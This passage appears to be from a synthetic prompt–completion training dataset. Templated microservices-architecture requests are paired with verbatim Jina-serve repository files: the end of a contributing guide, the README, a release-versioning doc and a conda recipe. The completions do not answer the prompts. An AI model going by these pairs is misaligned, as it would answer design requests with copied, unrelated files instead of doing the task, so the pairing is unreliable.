hooks\n\nIn Jina we use git's pre-commit hooks in order to make sure the code matches our standards of quality and documentation. At the moment we employ them for checking the style and the docstrings of the code. Documentation of code is crucial to maintaining productive developers and clear communication with new users. We also want to reduce all arguments about code styling.\n\nIt's easy to configure it:\n\n1. `pip install pre-commit`\n1. `pre-commit install`\n\nNow you will be automatically reminded to add docstrings to your code. `black` will take care that your code will match our style. Note that `black` will fail your commit but reformat your code, so you just need to add the files again and commit **again**.\n\nFor more about our docstring style, refer to [this guide](./.github/DOCSTRINGS.rst).\n\n#### Restoring correct git blame\n\nRun `git config blame.ignoreRevsFile .github/.git-blame-ignore-revs`\n\n<a name=\"-naming-conventions\"></a>\n## ☑️ Naming Conventions\n\nFor branches, commits, and PRs we follow some basic naming conventions:\n\n* Be descriptive\n* Use all lower-case\n* Limit punctuation\n* Include one of our specified [types](#specify-the-correct-types)\n* Short (under 70 characters is best)\n* In general, follow the [Conventional Commit](https://www.conventionalcommits.org/en/v1.0.0/#summary) guidelines\n\nNote: If you don't follow naming conventions, your commit will be automatically flagged to be fixed.\n\n### Specify the correct types\n\nType is an important prefix in PR, commit message. For each branch, commit, or PR, we need you to specify the type to help us keep things organized. For example,\n\n```\nfeat: add hat wobble\n^--^  ^------------^\n|     |\n|     +-> Summary in present tense.\n|\n+-------> Type: build, ci, chore, docs, feat, fix, refactor, style, or test.\n```\n\n- build: Changes that affect the build system or external dependencies (example scopes: gulp, broccoli, npm)\n- ci: Changes to our CI configuration files and scripts (example scopes: Travis, Circle, BrowserStack, SauceLabs)\n- docs: Documentation only changes\n- feat: A new feature\n- fix: A bug fix\n- perf: A code change that improves performance\n- refactor: A code change that neither fixes a bug nor adds a feature\n- style: Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc.)\n- test: Adding missing tests or correcting existing tests\n- chore: updating grunt tasks etc; no production code change\n\n### Naming your Branch\n\nYour branch name should follow the format `type-scope(-issue_id)`:\n\n* `type` is one of the [types above](#specify-the-correct-types)\n* `scope` is optional, and represents the module your branch is working on.\n* `issue_id` is [the GitHub issue](https://github.com/jina-ai/jina/issues) number. Having the correct issue number will automatically link the Pull Request on this branch to that issue.\n\n> Good examples:\n>\n```text\nfix-executor-loader-113\nchore-update-version\ndocs-add-cloud-section-33\n```\n\n> Bad examples:\n>\n\n| Branch name     | Feedback                                              |\n| ---             | ---                                                   |\n| `FIXAWESOME123` | Not descriptive enough, all caps, doesn't follow spec |\n| `NEW-test-1`    | Should be lower case, not descriptive                 |\n| `mybranch-1`    | No type, not descriptive                              |\n\n### Writing your Commit Message\n\nA good commit message helps us track Jina's development. A Pull Request with a bad commit message will be *rejected* automatically in the CI pipeline.\n\nCommit messages should stick to our [naming conventions](#-naming-conventions) outlined above, and use the format `type(scope?): subject`:\n\n* `type` is one of the [types above](#specify-the-correct-types).\n* `scope` is optional, and represents the module your commit is working on.\n* `subject` explains the commit, without an ending period`.`\n\nFor example, a commit that fixes a bug in the executor module should be phrased as: `fix(executor): fix the bad naming in init function`\n\n> Good examples:\n>\n```text\nfix(indexer): fix wrong sharding number in indexer\nfeat: add remote api\n```\n\n> Bad examples:\n>\n\n| Commit message                                                                                | Feedback                           |\n| ---                                                                                           | ---                                |\n| `doc(101): improved 101 document`                                                             | Should be `docs(101)`              |\n| `tests(flow): add unit test for flow exception`                                               | Should be `test(flow)`             |\n| `DOC(101): Improved 101 Documentation`                                                        | All letters should be in lowercase |\n| `fix(pea): i fix this pea and this looks really awesome and everything should be working now` | Too long                           |\n| `fix(pea):fix network receive of the pea`                                                     | Missing space after `:`            |\n| `hello: add hello-world`                                                                      | Type `hello` is not allowed          |\n\n#### What if I Mess Up?\n\nWe all make mistakes. GitHub has a guide on [rewriting commit messages](https://docs.github.com/en/free-pro-team@latest/github/committing-changes-to-your-project/changing-a-commit-message) so they can adhere to our standards.\n\nYou can also install [commitlint](https://commitlint.js.org/#/) onto your own machine and check your commit message by running:\n\n```bash\necho \"<commit message>\" | commitlint\n```\n\n### Naming your Pull Request\n\nWe don't enforce naming of PRs and branches, but we recommend you follow the same style. It can simply be one of your commit messages, just copy/paste it, e.g. `fix(readme): improve the readability and move sections`.\n\n<a name=\"-testing-jina-locally-and-on-ci\"></a>\n## 💥 Testing Jina Locally and on CI\n\nYou need to build a local docker image tagged 'jinaai/jina:test-pip' for all the tests to run as in the CI, via:\n\n```bash\ndocker build --build-arg PIP_TAG=\"[devel]\" -f ${PATH_TO_JINA}/Dockerfiles/pip.Dockerfile -t jinaai/jina:test-pip ${PATH_TO_JINA}\n```\n\nLocally you can do unittest via:\n\n```bash\npip install \".[test]\"\npytest -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests\n```\n\nTips: If you want to run the k8s tests then you should install [linkerd cli](https://linkerd.io/2.11/getting-started/#step-1-install-the-cli) before.\n\nWhen you add an executor or a driver, you may introduce new dependencies to Jina. You can verify the dependencies via:\n\n```bash\njina check\n```\n, and via Docker container:\n\n```bash\ndocker run jinaai/jina:my-local-version check\n```\n\nIt prints a list of components the current version of Jina supports, and then exits. Make sure yours are not in red.\n\nOnce you submit the PR, your code will be tested in the environment of Python 3.7 and 3.8 with [full extra dependencies](extra-requirements.txt) (`pip install .[all]`) installed.\n\n<a name=\"-contributing-documentation\"></a>\n## 📖 Contributing Documentation\n\nGood docs make developers happy, and we love happy developers! We've got a few different types of docs:\n\n* General documentation\n* Tutorials/examples\n* Docstrings in Python functions in RST format - generated by Sphinx\n\n### Documentation guidelines\n\n1. Decide if your page is a **guide or a tutorial**. Make sure it fits its section.\n2. Use “**you**” instead of “we” or “I”. It **engages** the reader more.\n3. **Sentence case** for headers. (Use [https://convertcase.net/](https://convertcase.net/) to check)\n4. Keep sentences short. If possible, **fewer than 13 words**.\n5. Only use `backticks` for direct references to code elements.\n6. Jina product names should be capitalized and not backticked (Flow, Executor, Hub etc.).\n7. All **acronyms** should be UPPERCASE (Ex. YAML, JSON, HTTP, SSL).\n8. Think about the **structure** of the page beforehand. Split it into headers before writing the content.\n9. If relevant, include a “**See also**” section at the end.\n10. Link to any existing explanations of the concepts you are using.\n\nBonus: **Know when to break the rules**. Documentation writing is as much art as it is science. Sometimes you will have to deviate from these rules in order to write good documentation.\n\n\n[MyST](https://myst-parser.readthedocs.io/en/latest/) Elements Usage\n\n1. Use the `{tab}` element to show multiple ways of doing one thing. [Example](https://jina.ai/serve/concepts/flow/basics/#start-and-stop) \n2. Use the `{admonition}` boxes with care. We recommend restricting yourself to [Hint](https://jina.ai/serve/concepts/flow/basics/#create), [Caution](https://jina.ai/serve/concepts/gateway/customize-http-endpoints/#enable-graphql-endpoint) and [See Also](https://jina.ai/serve/concepts/gateway/customize-http-endpoints/#enable-graphql-endpoint).\n3. Use `{dropdown}` to hide optional content, such as long code snippets or console output. [Example](https://jina.ai/serve/concepts/client/third-party-clients/#use-curl)\n\n### Building documentation on your local machine\n\n#### Requirements\n\n* Python 3\n* [jq](https://stedolan.github.io/jq/download/)\n\n#### Steps to build locally\n\n```bash\ncd docs\npip install -r requirements.txt\nexport NUM_RELEASES=10\nbash makedoc.sh local-only\n```\n\nDocs website will be generated in `_build/dirhtml`\nTo serve it, run\n\n```bash\ncd _build/dirhtml\npython -m http.server\n```\n\nYou can now see docs website on [http://localhost:8000](http://localhost:8000) on your browser.\n\n## 🙏 Thank You\n\nOnce again, thanks so much for your interest in contributing to Jina. We're excited to see your contributions!\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": "CONTRIBUTING.md", "language": "markdown", "complexity": "complex", "star_count": 21665, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 292}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Jina-Serve\n<a href=\"https://pypi.org/project/jina/\"><img alt=\"PyPI\" src=\"https://img.shields.io/pypi/v/jina?label=Release&style=flat-square\"></a>\n<a href=\"https://discord.jina.ai\"><img src=\"https://img.shields.io/discord/1106542220112302130?logo=discord&logoColor=white&style=flat-square\"></a>\n<a href=\"https://pypistats.org/packages/jina\"><img alt=\"PyPI - Downloads from official pypistats\" src=\"https://img.shields.io/pypi/dm/jina?style=flat-square\"></a>\n<a href=\"https://github.com/jina-ai/jina/actions/workflows/cd.yml\"><img alt=\"Github CD status\" src=\"https://github.com/jina-ai/jina/actions/workflows/cd.yml/badge.svg\"></a>\n\nJina-serve is a framework for building and deploying AI services that communicate via gRPC, HTTP and WebSockets. Scale your services from local development to production while focusing on your core logic.\n\n## Key Features\n\n- Native support for all major ML frameworks and data types\n- High-performance service design with scaling, streaming, and dynamic batching\n- LLM serving with streaming output\n- Built-in Docker integration and Executor Hub\n- One-click deployment to Jina AI Cloud\n- Enterprise-ready with Kubernetes and Docker Compose support\n\n<details>\n<summary><strong>Comparison with FastAPI</strong></summary>\n\nKey advantages over FastAPI:\n\n- DocArray-based data handling with native gRPC support\n- Built-in containerization and service orchestration\n- Seamless scaling of microservices\n- One-command cloud deployment\n</details>\n\n## Install \n\n```bash\npip install jina\n```\n\nSee guides for [Apple Silicon](https://jina.ai/serve/get-started/install/apple-silicon-m1-m2/) and [Windows](https://jina.ai/serve/get-started/install/windows/).\n\n## Core Concepts\n\nThree main layers:\n- **Data**: BaseDoc and DocList for input/output\n- **Serving**: Executors process Documents, Gateway connects services\n- **Orchestration**: Deployments serve Executors, Flows create pipelines\n\n## Build AI Services\n\nLet's create a gRPC-based AI service using StableLM:\n\n```python\nfrom jina import Executor, requests\nfrom docarray import DocList, BaseDoc\nfrom transformers import pipeline\n\n\nclass Prompt(BaseDoc):\n    text: str\n\n\nclass Generation(BaseDoc):\n    prompt: str\n    text: str\n\n\nclass StableLM(Executor):\n    def __init__(self, **kwargs):\n        super().__init__(**kwargs)\n        self.generator = pipeline(\n            'text-generation', model='stabilityai/stablelm-base-alpha-3b'\n        )\n\n    @requests\n    def generate(self, docs: DocList[Prompt], **kwargs) -> DocList[Generation]:\n        generations = DocList[Generation]()\n        prompts = docs.text\n        llm_outputs = self.generator(prompts)\n        for prompt, output in zip(prompts, llm_outputs):\n            generations.append(Generation(prompt=prompt, text=output))\n        return generations\n```\n\nDeploy with Python or YAML:\n\n```python\nfrom jina import Deployment\nfrom executor import StableLM\n\ndep = Deployment(uses=StableLM, timeout_ready=-1, port=12345)\n\nwith dep:\n    dep.block()\n```\n\n```yaml\njtype: Deployment\nwith:\n uses: StableLM\n py_modules:\n   - executor.py\n timeout_ready: -1\n port: 12345\n```\n\nUse the client:\n\n```python\nfrom jina import Client\nfrom docarray import DocList\nfrom executor import Prompt, Generation\n\nprompt = Prompt(text='suggest an interesting image generation prompt')\nclient = Client(port=12345)\nresponse = client.post('/', inputs=[prompt], return_type=DocList[Generation])\n```\n\n## Build Pipelines\n\nChain services into a Flow:\n\n```python\nfrom jina import Flow\n\nflow = Flow(port=12345).add(uses=StableLM).add(uses=TextToImage)\n\nwith flow:\n    flow.block()\n```\n\n## Scaling and Deployment\n\n### Local Scaling\n\nBoost throughput with built-in features:\n- Replicas for parallel processing\n- Shards for data partitioning\n- Dynamic batching for efficient model inference\n\nExample scaling a Stable Diffusion deployment:\n\n```yaml\njtype: Deployment\nwith:\n uses: TextToImage\n timeout_ready: -1\n py_modules:\n   - text_to_image.py\n env:\n  CUDA_VISIBLE_DEVICES: RR\n replicas: 2\n uses_dynamic_batching:\n   /default:\n     preferred_batch_size: 10\n     timeout: 200\n```\n\n### Cloud Deployment\n\n#### Containerize Services\n\n1. Structure your Executor:\n```\nTextToImage/\n├── executor.py\n├── config.yml\n├── requirements.txt\n```\n\n2. Configure:\n```yaml\n# config.yml\njtype: TextToImage\npy_modules:\n - executor.py\nmetas:\n name: TextToImage\n description: Text to Image generation Executor\n```\n\n3. Push to Hub:\n```bash\njina hub push TextToImage\n```\n\n#### Deploy to Kubernetes\n```bash\njina export kubernetes flow.yml ./my-k8s\nkubectl apply -R -f my-k8s\n```\n\n#### Use Docker Compose\n```bash\njina export docker-compose flow.yml docker-compose.yml\ndocker-compose up\n```\n\n#### JCloud Deployment\n\nDeploy with a single command:\n```bash\njina cloud deploy jcloud-flow.yml\n```\n\n## LLM Streaming\n\nEnable token-by-token streaming for responsive LLM applications:\n\n1. Define schemas:\n```python\nfrom docarray import BaseDoc\n\n\nclass PromptDocument(BaseDoc):\n    prompt: str\n    max_tokens: int\n\n\nclass ModelOutputDocument(BaseDoc):\n    token_id: int\n    generated_text: str\n```\n\n2. Initialize service:\n```python\nfrom transformers import GPT2Tokenizer, GPT2LMHeadModel\n\n\nclass TokenStreamingExecutor(Executor):\n    def __init__(self, **kwargs):\n        super().__init__(**kwargs)\n        self.model = GPT2LMHeadModel.from_pretrained('gpt2')\n```\n\n3. Implement streaming:\n```python\n@requests(on='/stream')\nasync def task(self, doc: PromptDocument, **kwargs) -> ModelOutputDocument:\n    input = tokenizer(doc.prompt, return_tensors='pt')\n    input_len = input['input_ids'].shape[1]\n    for _ in range(doc.max_tokens):\n        output = self.model.generate(**input, max_new_tokens=1)\n        if output[0][-1] == tokenizer.eos_token_id:\n            break\n        yield ModelOutputDocument(\n            token_id=output[0][-1],\n            generated_text=tokenizer.decode(\n                output[0][input_len:], skip_special_tokens=True\n            ),\n        )\n        input = {\n            'input_ids': output,\n            'attention_mask': torch.ones(1, len(output[0])),\n        }\n```\n\n4. Serve and use:\n```python\n# Server\nwith Deployment(uses=TokenStreamingExecutor, port=12345, protocol='grpc') as dep:\n    dep.block()\n\n\n# Client\nasync def main():\n    client = Client(port=12345, protocol='grpc', asyncio=True)\n    async for doc in client.stream_doc(\n        on='/stream',\n        inputs=PromptDocument(prompt='what is the capital of France ?', max_tokens=10),\n        return_type=ModelOutputDocument,\n    ):\n        print(doc.generated_text)\n```\n\n## Support\n\nJina-serve is backed by [Jina AI](https://jina.ai) and licensed under [Apache-2.0](./LICENSE).\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": "README.md", "language": "markdown", "complexity": "complex", "star_count": 21665, "quality_score": 0.9500000000000001, "features": {"has_microservices": true, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 274}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Release & Version Identifier\n\nJina is shipped from two package management systems, PyPi and Docker Hub. This article clarifies the release cycle and version identifier behind each system.\n\n<!-- START doctoc generated TOC please keep comment here to allow auto update -->\n<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->\n\n- [PyPi package versioning](#pypi-package-versioning)\n- [Docker image versioning](#docker-image-versioning)\n- [Manual Release Entrypoint](#manual-release-entrypoint)\n\n<!-- END doctoc generated TOC please keep comment here to allow auto update -->\n\n\n## PyPi package versioning\n\nWe follow [PEP-440](https://www.python.org/dev/peps/pep-0440/), and a form of [semantic versioning](https://semver.org/) as explained above.\n\nTo install the latest final release:\n\n```bash\npip install -U jina\n```\n\nTo install a particular final release:\n\n```bash\npip install jina==x.y.z\n```\n\nThe term \"final release\" is relative to \"developmental release\" as described below.  \n\n### Install Jina with Recommended Extensions\n\n`pip install -U jina` only installs the core dependencies of Jina.\n\nThe recommended way of installing Jina is `pip install -U jina`\n\n`\"standard\"` include extra dependencies that enables:\n- Executor Hub + Docker support\n- FastAPI + Websocket support (required when using `Flow(protocol='http')` or `Flow(protocol='websocket')`)\n- the best compression via LZ4 algorithm\n- the best async eventloop management via `uvloop`\n\nOther extension tags such as  `[devel]` can be found in [extra-requirements.txt](extra-requirements.txt). \n\n##### Do I need \"[standard]\"?\n\nDepends on how you use and distribute Jina. \n\nIf you are using/distributing Jina as a microservice, you often only need to install the core dependencies via `pip install jina`.\n\n### Developmental releases versioning\n\nOne every master-merging event, we create early releases directly from source control which do not conflict with later project releases. The version identifier for development release is `x.y.z.devN`, which adds a suffix `.dev`, followed by a non-negative integer value `N`, which is reset on every release.\n\nTo install the latest development release:\n\n```bash\npip install --pre jina\n```\n\n### Version epochs\n\n\n#### Release cycle and versioning\nJina is developed continuously by the community and core team. Updates are grouped and released at regular intervals to align with software development best practices.\n\nJina follows a form of numbered versioning. The version number of the product is a three-part value `x.y.z` where `x`, `y`, and `z` are the major, minor, and patch components respectively.\n\n-   Patch release (`x.y.z` -> `x.y.(z+1)`): Contain bug fixes, new features and breaking changes. Released weekly on a Wednesday morning CET.\n-   Minor release (`x.y.z -> x.(y+1).0`): Contain bug fixes, new features and breaking changes. Released monthly on the first Wednesday of the month CET. This release is more QA tested and considered more stable than a patch release.\n-   Major release (`x.y.z -> (x+1).0.0`): Are released based on the development cycle of the Jina company. There is no set scheduled for when these will occur.\n\n\nThe following example shows how Jina is released from 0.9 to 0.9.2 according to the schema we defined above.\n\n|Event `e` | After `e`, `pip install jina` | After `e`, `pip install --pre jina` | After `e`, master `__init__.py` |\n|--- | ---  | --- | --- |\n| Release | 0.9.0 | 0.9.0 | 0.9.1.dev0 |\n| Master merging | 0.9.0 | 0.9.1.dev0 | 0.9.1.dev1 |\n| Master merging | 0.9.0 | 0.9.1.dev1 | 0.9.1.dev2 |\n| Master merging | 0.9.0 | 0.9.1.dev2 | 0.9.1.dev3 |\n| Release | 0.9.1 | 0.9.1 | 0.9.2.dev0 |\n| Master merging | 0.9.1 | 0.9.2.dev0 | 0.9.2.dev1 |\n\n## Docker image versioning\n\nOur universal Docker image is ready-to-use on linux/amd64, linux/armv7+, linux/arm/v6, linux/arm64. The Docker image name always starts with `jinaai/jina` followed by a tag composed of three parts:\n\n```text\njinaai/jina:{version}{python_version}{extra}\n```\n\n- `{version}`: The version of Jina. Possible values:\n    - `latest`: the last release;\n    - `master`: the master branch of `jina-ai/jina` repository;\n    - `x.y.z`: the release of a particular version;\n    - `x.y`: the alias to the last `x.y.z` patch release, i.e. `x.y` = `x.y.max(z)`;\n- `{python_version}`: The Python version of the image. Possible values:\n    - `-py37`: Python 3.7;\n    - ` `, `-py38` for Python 3.8;\n    - `-py39` for Python 3.9;\n    - `-py310` for Python 3.10;\n    - `-py311` for Python 3.11;\n- `{extra}`: the extra dependency installed along with Jina. Possible values:\n    - ` `: Jina is installed inside the image via `pip install jina`;\n    - `-standard`: Jina is installed inside the image via `pip install jina`. It includes all recommended dependencies;  \n    - `-devel`: Jina is installed inside the image via `pip install \"jina[devel]\"`. It includes `standard` plus some extra dependencies;\n\nExamples:\n\n- `jinaai/jina:0.9.6`: the `0.9.6` release with Python 3.7 and the entrypoint of `jina`.\n- `jinaai/jina:latest`: the latest release with Python 3.7 and the entrypoint of `jina`\n- `jinaai/jina:master`: the master with Python 3.7 and the entrypoint of `jina`\n\n### Image alias and updates\n\n| Event | Updated images | Aliases |\n| --- | --- | --- |\n| On Master Merge | `jinaai/jina:master{python_version}{extra}` | |\n| On `x.y.z` release | `jinaai/jina:x.y.z{python_version}{extra}` | `jinaai/jina:latest{python_version}{extra}`, `jinaai/jina:x.y{python_version}{extra}` |\n\nSix images are built, i.e. taking the combination of:\n  - `{python_version} = [\"-py37\", \"-py38\", \"-py39\"]`\n  - `{extra} = [\"\", \"-devel\", \"-standard\"]`\n\n\n### Image size on different tags\n\n|Image Size|\n| ---|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest?label=jinaai%2Fjina%3Alatest&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest-py38?label=jinaai%2Fjina%3Alatest-py38&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest-py39?label=jinaai%2Fjina%3Alatest-py39&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest-devel?label=jinaai%2Fjina%3Alatest-devel&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest-daemon?label=jinaai%2Fjina%3Alatest-daemon&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest-standard?label=jinaai%2Fjina%3Alatest-standard&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest-py38-devel?label=jinaai%2Fjina%3Alatest-py38-devel&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest-py38-daemon?label=jinaai%2Fjina%3Alatest-py38-daemon&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest-py38-standard?label=jinaai%2Fjina%3Alatest-py38-standard&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest-py39-devel?label=jinaai%2Fjina%3Alatest-py39-devel&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest-py39-daemon?label=jinaai%2Fjina%3Alatest-py39-daemon&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/latest-py39-standard?label=jinaai%2Fjina%3Alatest-py39-standard&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master?label=jinaai%2Fjina%3Amaster&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master-py38?label=jinaai%2Fjina%3Amaster-py38&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master-py39?label=jinaai%2Fjina%3Amaster-py39&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master-devel?label=jinaai%2Fjina%3Amaster-devel&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master-daemon?label=jinaai%2Fjina%3Amaster-daemon&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master-standard?label=jinaai%2Fjina%3Amaster-standard&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master-py38-devel?label=jinaai%2Fjina%3Amaster-py38-devel&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master-py38-daemon?label=jinaai%2Fjina%3Amaster-py38-daemon&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master-py38-standard?label=jinaai%2Fjina%3Amaster-py38-standard&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master-py39-devel?label=jinaai%2Fjina%3Amaster-py39-devel&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master-py39-daemon?label=jinaai%2Fjina%3Amaster-py39-daemon&logo=docker)|\n|![](https://img.shields.io/docker/image-size/jinaai/jina/master-py39-standard?label=jinaai%2Fjina%3Amaster-py39-standard&logo=docker)|\n\n---\n\n## Manual Release Entrypoint\n\nManual release entrypoint is designed for authorized core developers of Jina.\n\n### Trigger weekly release manually\n\nOne can release a hotfix immediately without waiting for the weekly release. Here are the steps:\n\n1. [Go to here](https://github.com/jina-ai/jina/actions?query=workflow%3A%22Manual+Release%22)\n2. Click on \"Run Workflow\" dropdown button on the right and input the release token and the release reason.\n3. Click on \"Run Workflow\" green button.\n\n### Rebuild all Docker images for certain `git tag` manually\n\n1. [Go to here](https://github.com/jina-ai/jina/actions?query=workflow%3A%22Manual+Docker+Build%22)\n2. Click on \"Run Workflow\" dropdown button on the right and input the release token and the release reason.\n3. Click on \"Run Workflow\" green button.\n\n![Rebuild all Docker images](.github/images/manual-docker-build.png)\n\nNote, the manual rebuild on Docker images will *NOT* update `:latest-*` and `:x.y-*` aliases.\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": "RELEASE.md", "language": "markdown", "complexity": "medium", "star_count": 21665, "quality_score": 0.8300000000000001, "features": {"has_microservices": true, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": true, "line_count": 181}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "{% set name = \"jina\" %}\n{% set version = \"3.11.0\" %}\n\npackage:\n  name: {{ name|lower }}-split\n  version: {{ version }}\n\nsource:\n  url: https://pypi.io/packages/source/{{ name[0] }}/{{ name }}/{{ name }}-{{ version }}.tar.gz\n  sha256: 49a7fec74b3b0927143d73ce787c7e3fe5e52fa2a1079323248a20590d2bf49f\n\nbuild:\n  number: 0\n\noutputs:\n  - name: jina-core\n    build:\n      noarch: python\n      entry_points:\n        - jina = cli:main\n      script: python -m pip install . --no-deps -vv\n      script_env:\n        - JINA_PIP_INSTALL_CORE=1\n    test:\n      requires:\n        - pip\n      imports:\n        - jina\n      commands:\n        - pip check\n        - jina --version\n    requirements:\n      host:\n        - python >=3.7\n        - pip\n      run:\n        - __unix\n        - python >=3.7\n        - docarray >=0.16.4\n        - grpcio >=1.46.0,<1.48.1\n        - grpcio-health-checking >=1.46.0,<1.48.1\n        - grpcio-reflection >=1.46.0,<1.48.1\n        - jina-hubble-sdk ==0.23.3\n        - numpy\n        - opentelemetry-api >=1.12.0\n        - opentelemetry-instrumentation-grpc >=0.33b0\n        - packaging >=20.0\n        - protobuf >=3.20.0\n        - pyyaml >=5.3.1\n  - name: jina-perf\n    test:\n      requires:\n        - pip\n      imports:\n        - jina\n      commands:\n        - pip check\n        - jina --version\n    build:\n      noarch: python\n      entry_points:\n        - jina = cli:main\n      script: python -m pip install . --no-deps -vv\n      script_env:\n        - JINA_PIP_INSTALL_PERF=1\n    requirements:\n      host:\n        - python >=3.7\n        - pip\n      run:\n        - __unix\n        - python >=3.7\n        - docarray >=0.16.4\n        - grpcio >=1.46.0,<1.48.1\n        - grpcio-health-checking >=1.46.0,<1.48.1\n        - grpcio-reflection >=1.46.0,<1.48.1\n        - jina-hubble-sdk ==0.23.3\n        - numpy\n        - opentelemetry-api >=1.12.0\n        - opentelemetry-exporter-otlp >=1.12.0\n        - opentelemetry-instrumentation-aiohttp-client >=0.33b0\n        - opentelemetry-instrumentation-fastapi >=0.33b0\n        - opentelemetry-instrumentation-grpc >=0.33b0\n        - opentelemetry-sdk >=1.12.0\n        - opentelemetry-semantic-conventions >=0.33b0\n        - packaging >=20.0\n        - prometheus_client\n        - protobuf >=3.20.0\n        - pyyaml >=5.3.1\n        - uvloop\n  - name: jina\n    test:\n      requires:\n        - pip\n      imports:\n        - jina\n      commands:\n        - pip check\n        - jina --version\n    build:\n      noarch: python\n      entry_points:\n        - jina = cli:main\n      script: python -m pip install . --no-deps -vv\n    requirements:\n      host:\n        - python >=3.7\n        - pip\n      run:\n        - __unix\n        - python >=3.7\n        - aiofiles\n        - aiohttp\n        - aiostream\n        - cryptography\n        - docarray >=0.16.4\n        - docker-py\n        - fastapi >=0.76.0\n        - filelock\n        - grpcio >=1.46.0,<1.48.1\n        - grpcio-health-checking >=1.46.0,<1.48.1\n        - grpcio-reflection >=1.46.0,<1.48.1\n        - jina-hubble-sdk ==0.23.3\n        - numpy\n        - opentelemetry-api >=1.12.0\n        - opentelemetry-exporter-otlp >=1.12.0\n        - opentelemetry-instrumentation-aiohttp-client >=0.33b0\n        - opentelemetry-instrumentation-fastapi >=0.33b0\n        - opentelemetry-instrumentation-grpc >=0.33b0\n        - opentelemetry-sdk >=1.12.0\n        - opentelemetry-semantic-conventions >=0.33b0\n        - packaging >=20.0\n        - pathspec\n        - prometheus_client\n        - protobuf >=3.20.0\n        - pydantic\n        - python-multipart\n        - pyyaml >=5.3.1\n        - requests\n        - uvicorn\n        - uvloop\n        - websockets\n\nabout:\n  home: https://github.com/jina-ai/jina/\n  license: Apache-2.0\n  license_family: Apache\n  license_file: LICENSE\n  summary: \"Build multimodal AI services via cloud native technologies \\xB7 Neural Search \\xB7 Generative AI \\xB7 Cloud Native\"\n  doc_url: https://jina.ai/serve\n\nextra:\n  recipe-maintainers:\n    - JoanFM\n    - nan-wang\n    - hanxiao\n  feedstock-name: jina\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": "conda/meta.yaml", "language": "yaml", "complexity": "medium", "star_count": 21665, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 158}, "authority_level": "high", "authentic": true}}
